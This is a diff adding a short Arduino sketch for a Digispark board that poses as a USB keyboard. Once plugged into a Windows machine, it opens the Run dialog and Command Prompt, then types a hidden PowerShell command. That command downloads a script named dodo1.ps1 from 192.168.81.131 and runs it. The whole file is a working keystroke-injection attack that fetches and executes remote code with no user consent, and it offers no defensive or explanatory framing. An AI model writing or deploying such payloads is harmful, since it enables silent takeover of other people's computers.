@@ -1,1 +1,22 @@
 
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.sendKeyStroke(0); // Initializes
+  DigiKeyboard.delay(1000);
+
+  // Open Run dialog (Windows + R)
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1500);
+
+  // Type "cmd" to open Command Prompt
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(4000);
+
+  // Launch PowerShell and download + execute the script
+  DigiKeyboard.print("powershell -w hidden -c \"iwr http://192.168.81.131/dodo1.ps1 -OutFile dodo1.ps1; .\\dodo1.ps1\"");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void loop() {}
